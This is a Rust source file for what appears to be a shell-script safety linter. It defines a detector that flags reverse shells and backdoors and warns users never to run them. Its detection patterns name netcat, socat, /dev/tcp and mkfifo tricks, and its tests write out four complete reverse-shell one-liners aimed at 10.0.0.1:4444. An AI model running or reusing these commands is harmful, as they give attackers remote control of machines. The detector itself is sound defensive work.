use crate::analysis::Flag;
use crate::config::NoConfig;
use crate::model::{Detail, Verdict};
use crate::parser::{Command, Ctx};
use crate::register_flag;

pub struct ReverseShell {
    reported: bool,
}

/// `nc -e`, `ncat --exec`, `socat … EXEC:`, `telnet | sh` style backdoors.
fn command_backdoor(c: &Command) -> Option<&'static str> {
    match c.name.as_str() {
        "nc" | "ncat" | "netcat"
            if c.short_flags().any(|f| f == 'e') || c.has_arg("--exec") || c.has_arg("-c") =>
        {
            Some("netcat with a command shell (-e/-c)")
        }
        "socat"
            if c.args
                .iter()
                .any(|w| w.text.contains("EXEC:") || w.text.contains("SYSTEM:")) =>
        {
            Some("socat EXEC/SYSTEM redirection")
        }
        _ => None,
    }
}

impl Flag for ReverseShell {
    fn visit_command(&mut self, c: &Command) -> Verdict {
        let Some(what) = command_backdoor(c).filter(|_| !self.reported) else {
            return Verdict::Ignore;
        };
        self.reported = true;
        dead(format!("opens a backdoor: {what}"), c.span.clone())
    }

    /// `/dev/tcp` and `/dev/udp` redirection and the `mkfifo … | sh -i` idiom are lexical, not command nodes.
    fn finalize(&mut self, ctx: &Ctx) -> Verdict {
        if self.reported {
            return Verdict::Ignore;
        }
        let src = &ctx.source;
        if let Some(pos) = ["/dev/tcp/", "/dev/udp/"].iter().find_map(|p| src.find(p)) {
            return dead(
                "connects a shell to a raw TCP/UDP socket (`/dev/tcp`)".into(),
                pos..pos + 9,
            );
        }
        let compact: String = src.chars().filter(|c| !c.is_whitespace()).collect();
        if compact.contains("mkfifo")
            && (compact.contains("|sh-i")
                || compact.contains("|/bin/sh-i")
                || compact.contains("|bash-i"))
        {
            return dead("classic mkfifo reverse-shell backdoor".into(), 0..src.len());
        }
        Verdict::Ignore
    }
}

fn dead(what: String, span: crate::model::Span) -> Verdict {
    Verdict::Dead(
        Detail::new(what, "This hands remote control of your machine to whoever is on the other end of the connection.")
            .fix("Do not run this under any circumstances.")
            .at(span),
    )
}

register_flag! {
    id: "reverse_shell",
    kind: Dead,
    category: Exec,
    description: "Reverse shells and backdoors: /dev/tcp, nc -e, socat EXEC, mkfifo pipe-to-shell",
    weight: 5,
    config: NoConfig,
    build: |_cfg, _shared| ReverseShell { reported: false },
}

#[cfg(test)]
mod tests {
    use super::super::testing::*;
    use crate::model::FlagKind;

    #[test]
    fn detects_backdoors() {
        assert_eq!(
            kind("reverse_shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("reverse_shell", "nc -e /bin/sh 10.0.0.1 4444"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("reverse_shell", "socat TCP:10.0.0.1:4444 EXEC:/bin/bash"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind(
                "reverse_shell",
                "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f"
            ),
            Some(FlagKind::Dead)
        );
        assert!(!fires("reverse_shell", "nc -z localhost 80"));
    }
}
